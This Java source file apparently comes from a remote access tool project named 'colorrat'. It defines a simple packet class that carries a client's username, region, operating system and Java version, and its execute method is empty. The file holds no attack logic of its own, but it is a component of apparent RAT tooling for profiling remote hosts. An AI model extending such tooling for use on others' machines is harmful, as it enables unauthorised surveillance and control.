package eu.aragonapp.colorrat.network.packet.types.client;

import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.packet.Packet;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class C01PacketInformations extends Packet {

    private static final long serialVersionUID = 1L;

    public String javaVersion, region, username, os;

    public C01PacketInformations(String username, String region, String os, String javaVersion) {
        this.javaVersion = javaVersion;
        this.username = username;
        this.region = region;
        this.os = os;
    }

    @Override
    public void execute(NetworkConnection connection) { }

}
